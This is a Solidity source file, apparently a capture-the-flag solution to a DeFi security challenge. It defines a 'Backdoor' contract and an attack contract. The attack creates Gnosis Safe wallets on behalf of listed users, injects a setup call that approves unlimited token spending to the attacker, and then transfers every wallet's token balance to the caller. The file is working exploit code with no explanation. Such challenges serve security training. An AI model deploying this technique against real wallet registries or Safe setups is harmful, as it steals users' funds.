// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {GnosisSafe} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import {GnosisSafeProxy} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import {IProxyCreationCallback} from "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import {WalletRegistry} from "../backdoor/WalletRegistry.sol";

interface IGnosisFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract Backdoor {
    function approve(address attacker, IERC20 token) public {
        token.approve(attacker, type(uint256).max);
    }
}

contract Attack11 {
    GnosisSafe private immutable masterCopy;
    IGnosisFactory private immutable walletFactory;
    WalletRegistry private immutable walletRegistry;
    IERC20 public immutable token;

    Backdoor private backdoor;

    constructor(
        address _masterCopy,
        address _walletFactory,
        address _walletRegistry,
        address _token,
        address[] memory users
    ) {
        // Set storage variables
        masterCopy = GnosisSafe(payable(_masterCopy));
        walletFactory = IGnosisFactory(_walletFactory);
        walletRegistry = WalletRegistry(_walletRegistry);
        token = IERC20(_token);

        // Deploy the backdoor contract
        backdoor = new Backdoor();

        // Create wallet for each user and steal their tokens
        bytes memory initializer;
        address[] memory owners = new address[](1);
        address wallet;

        for (uint256 i = 0; i < users.length; ) {
            owners[0] = users[i];
            initializer = abi.encodeCall(
                GnosisSafe.setup,
                (
                    owners,
                    1,
                    address(backdoor),
                    abi.encodeCall(backdoor.approve, (address(this), token)),
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );

            wallet = address(
                walletFactory.createProxyWithCallback(
                    address(masterCopy),
                    initializer,
                    0,
                    walletRegistry
                )
            );

            token.transferFrom(wallet, msg.sender, token.balanceOf(wallet));

            unchecked {
                ++i;
            }
        }
    }
}
